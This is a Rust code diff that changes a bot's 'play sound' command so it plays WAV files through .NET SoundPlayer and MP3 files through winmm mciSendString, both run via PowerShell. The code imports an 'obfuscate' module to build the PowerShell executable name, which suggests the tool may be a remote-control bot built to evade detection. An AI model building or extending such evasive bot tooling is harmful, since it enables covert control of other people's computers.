@@ -93,15 +93,39 @@ impl BotCommand for PlaySoundCommand {
 }
 
 impl PlaySoundCommand {
-    fn play_local(file_path: &str, volume: u32) -> Result<()> {
-        // Use WMPlayer.OCX which works better in headless mode
-        let vol_level = (volume as f32 / 100.0 * 100.0) as u32;
-        
-        let ps_script = format!(
-            r#"$wmp = New-Object -ComObject WMPlayer.OCX; $wmp.settings.volume = {}; $wmp.URL = '{}'; $wmp.controls.play(); while($wmp.playState -ne 1) {{ Start-Sleep -Milliseconds 500 }}; $wmp.close()"#,
-            vol_level,
-            file_path.replace("'", "''")
-        );
+    fn play_local(file_path: &str, _volume: u32) -> Result<()> {
+        // Use PowerShell with .NET SoundPlayer for WAV files, or mciSendString for MP3
+        let ext = std::path::Path::new(file_path)
+            .extension()
+            .and_then(|e| e.to_str())
+            .unwrap_or("")
+            .to_lowercase();
+
+        let ps_script = if ext == "wav" {
+            // WAV files: Use SoundPlayer (synchronous, reliable)
+            format!(
+                r#"Add-Type -AssemblyName System.Media; $p = New-Object System.Media.SoundPlayer '{}'; $p.PlaySync()"#,
+                file_path.replace("'", "''")
+            )
+        } else {
+            // MP3/other formats: Use mciSendString
+            format!(
+                r#"Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class MCI {{
+    [DllImport("winmm.dll")]
+    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int retLen, IntPtr hwnd);
+}}
+'@
+$f = '{}'
+[MCI]::mciSendString("close all", $null, 0, [IntPtr]::Zero)
+[MCI]::mciSendString("open `"$f`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)
+[MCI]::mciSendString("play mp3 wait", $null, 0, [IntPtr]::Zero)
+[MCI]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)"#,
+                file_path.replace("'", "''").replace("`", "``")
+            )
+        };
 
         use crate::utils::obfuscate::{exe, powershell as ps};
         std::process::Command::new(exe::powershell())
